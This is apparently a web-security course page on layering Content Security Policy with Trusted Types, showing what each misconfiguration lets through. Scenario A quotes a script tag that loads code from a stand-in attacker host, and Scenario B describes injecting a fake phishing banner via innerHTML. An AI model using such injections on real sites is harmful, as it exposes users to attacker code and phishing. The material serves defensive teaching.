Deep Dive · CSP + Trusted Types LayeringFailure Modes When One Layer Is Misconfigured

Every scenario below is reconstructed directly from real, verified module results in this course — not hypothetical. Reading them side by side shows exactly what gap each layer leaves when the OTHER one is doing all the work.

Scenario A: Trusted Types only, no CSP script-src restriction

Suppose a page ships require-trusted-types-for 'script' with a real, careful sanitizing policy (Module 24's shape) — but never adds a real script-src restriction at all (Module 1's baseline for scripts specifically).

What still gets through A <script src="https://attacker.example/evil.js"> written directly into the page's own HTML (not via a guarded sink at all — <script src> written in markup is parser-inserted, and Trusted Types' HTML-sink guard has no jurisdiction over static markup the server itself sent). Module 1 already proved this loads and executes freely with no policy of any kind present. Trusted Types' sink guard never even enters the picture for content that was never assigned via a sink to begin with.

Scenario B: CSP script-src only, no Trusted Types

Suppose a page ships the strictest possible script-src 'self' 'nonce-...', with no 'unsafe-inline', no 'unsafe-eval' — but never adds require-trusted-types-for at all. This is exactly Module 14's setup.

What still gets through Any non-executing HTML injected via innerHTML — a fake "Account Suspended" banner with a real link to an attacker's phishing page, verbatim from Module 14's Proof B. Zero CSP violations, because nothing in it tries to execute. The strictest script-src imaginable does not gate this at all.

Scenario C: both layers present, but the Trusted Types policy is too permissive

Suppose both directives are present, but the createHTML rule (Module 17's "default" pattern, or any named policy) simply returns its input unchanged — no sanitization at all.

What still gets through Everything Module 14's Proof A and B both tested — a permissive policy satisfies the TYPE check (Module 18) perfectly while providing none of the CONTENT filtering a real sanitizer like Module 24's DOMPurify integration does. Trusted Types guarantees a value went through SOME policy — it says nothing about whether that policy did anything useful. This is why Module 24 exists as a separate, later module: the mechanism (Modules 15–20) and the actual defense quality (Module 24) are genuinely different concerns.

The pattern across all three

Each scenario's gap is exactly the OTHER layer's core competency — because the two were designed, and adopted historically, to cover genuinely disjoint attack surfaces. Neither is a superset of the other, which is precisely why this course builds them as two tracks rather than one extended one.
